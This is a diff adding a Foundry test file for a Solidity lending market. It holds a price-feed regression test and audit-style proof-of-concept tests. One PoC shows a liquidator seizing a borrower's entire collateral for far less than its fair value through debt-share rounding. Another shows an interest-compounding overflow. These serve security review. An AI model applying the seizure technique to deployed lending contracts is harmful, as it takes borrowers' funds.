@@ -1,0 +1,158 @@
+// SPDX-License-Identifier: Apache-2.0
+pragma solidity ^0.8.20;
+
+import {Test} from "forge-std/Test.sol";
+import {LendingMarket, IERC20} from "../../src/LendingMarket.sol";
+
+contract Round2USDC {
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
+    function approve(address spender, uint256 amount) external returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        return true;
+    }
+    function transfer(address to, uint256 amount) external returns (bool) {
+        balanceOf[msg.sender] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
+        allowance[from][msg.sender] -= amount;
+        balanceOf[from] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+}
+
+contract LendingMarketRound2FixesPoC is Test {
+    address internal constant MARK_PX = 0x0000000000000000000000000000000000000806;
+    address internal constant ORACLE_PX = 0x0000000000000000000000000000000000000807;
+    address internal constant BBO = 0x000000000000000000000000000000000000080e;
+    uint32 internal constant HYPE_PERP = 135;
+    uint256 internal constant WAD = 1e18;
+
+    Round2USDC internal usdc;
+
+    function setUp() public { usdc = new Round2USDC(); }
+
+    function _market() internal returns (LendingMarket) {
+        return new LendingMarket(IERC20(address(usdc)), 0, HYPE_PERP, 2, 100, 100, 100);
+    }
+
+    function _quote(uint64 oracle4, uint64 mark4) internal {
+        vm.mockCall(ORACLE_PX, abi.encode(HYPE_PERP), abi.encode(oracle4));
+        vm.mockCall(MARK_PX, abi.encode(HYPE_PERP), abi.encode(mark4));
+        vm.mockCall(BBO, abi.encode(HYPE_PERP), abi.encode(mark4 == 0 ? 0 : mark4 - 1, mark4 + 1));
+    }
+
+    function _supply(LendingMarket market, address lender, uint256 amount) internal {
+        usdc.mint(lender, amount);
+        vm.startPrank(lender);
+        usdc.approve(address(market), type(uint256).max);
+        market.supply(amount);
+        vm.stopPrank();
+    }
+
+    function _sixtyPercentLoan(LendingMarket market, address borrower) internal {
+        vm.deal(borrower, 10 ether);
+        vm.startPrank(borrower);
+        market.depositCollateral{value: 10 ether}();
+        market.borrow(240e6); // 60% of $400 at the initial $40 quote
+        vm.stopPrank();
+    }
+
+    function test_regression_singleFeedDownCannotLiquidate_and_zeroReverts() public {
+        LendingMarket market = _market();
+        address lender = address(6);
+        address borrower = address(7);
+        address liquidator = address(8);
+        _quote(40e4, 40e4);
+        _supply(market, lender, 1_000e6);
+        _sixtyPercentLoan(market, borrower);
+        usdc.mint(liquidator, 1_000e6);
+        vm.prank(liquidator);
+        usdc.approve(address(market), type(uint256).max);
+
+        // A mark/book push down cannot use the unchanged oracle to liquidate, and the converse
+        // is also true: max(oracle, mark) keeps this loan at its $40 / 60%-LTV value.
+        _quote(40e4, 30e4);
+        vm.prank(liquidator);
+        vm.expectRevert(abi.encodeWithSelector(LendingMarket.Healthy.selector, 6_000));
+        market.liquidate(borrower, type(uint256).max);
+        _quote(30e4, 40e4);
+        vm.prank(liquidator);
+        vm.expectRevert(abi.encodeWithSelector(LendingMarket.Healthy.selector, 6_000));
+        market.liquidate(borrower, type(uint256).max);
+
+        // A high mark with a low oracle is also conservative (price 50 -> 48% LTV), while two
+        // zero feeds fail closed instead of valuing collateral at zero.
+        _quote(30e4, 50e4);
+        vm.prank(liquidator);
+        vm.expectRevert(abi.encodeWithSelector(LendingMarket.Healthy.selector, 4_800));
+        market.liquidate(borrower, type(uint256).max);
+        _quote(0, 0);
+        vm.expectRevert(LendingMarket.NoPrice.selector);
+        market.liquidationPrice();
+    }
+
+    function test_POC_takesAllSeizesCollateralUnsupportedByActualPaidDebt() public {
+        LendingMarket market = _market();
+        address lender = address(1);
+        address borrower = address(2);
+        address liquidator = address(3);
+        _quote(40e4, 40e4);
+        _supply(market, lender, 1_000e6);
+
+        // Keep utilisation at 100%, so the rate is its 100% annual maximum, but give the
+        // borrower collateral worth $2m. After 28 untouched years one debt-share is worth
+        // over $1m, making share rounding materially coarse.
+        vm.deal(borrower, 50_000 ether);
+        vm.startPrank(borrower);
+        market.depositCollateral{value: 50_000 ether}();
+        market.borrow(1_000e6);
+        vm.stopPrank();
+        skip(28 * 365 days);
+
+        usdc.mint(liquidator, 3_000_000e6);
+        vm.startPrank(liquidator);
+        usdc.approve(address(market), type(uint256).max);
+        uint256 balanceBefore = usdc.balanceOf(liquidator);
+        uint256 seized = market.liquidate(borrower, type(uint256).max);
+        uint256 paid = balanceBefore - usdc.balanceOf(liquidator);
+        vm.stopPrank();
+
+        // `takesAll` was selected using the pre-rounding collateral capacity, but one whole
+        // share is all that can be burned. The collateral that the *actual* payment earns is
+        // substantially below the entire 50,000 HYPE balance.
+        uint256 fairSeize = paid * 1e12 * 10_500 / 10_000 * WAD / 40e18;
+        emit log_named_uint("paid (USDC base units)", paid);
+        emit log_named_uint("fair seize (wei)", fairSeize);
+        emit log_named_uint("actual seize (wei)", seized);
+        assertEq(seized, 50_000 ether);
+        assertLt(fairSeize, 40_000 ether);
+        assertGt(seized - fairSeize, 10_000 ether);
+        assertEq(market.collateral(borrower), 0);
+    }
+
+    function test_POC_rpowLastSquareOverflowsAfterSixtyEightYears() public {
+        LendingMarket market = _market();
+        address lender = address(4);
+        address borrower = address(5);
+        _quote(40e4, 40e4);
+        _supply(market, lender, 1_000e6);
+        vm.deal(borrower, 100 ether);
+        vm.startPrank(borrower);
+        market.depositCollateral{value: 100 ether}();
+        market.borrow(1_000e6); // 100% utilisation -> exactly 100% annual rate
+        vm.stopPrank();
+
+        // 2^31 seconds has a representable e^68 debt factor. `_rpow` nevertheless squares
+        // that final factor once more although its result is unused, overflowing before it
+        // can return the representable answer.
+        skip(2 ** 31);
+        vm.expectRevert();
+        market.debtOf(borrower);
+    }
+}
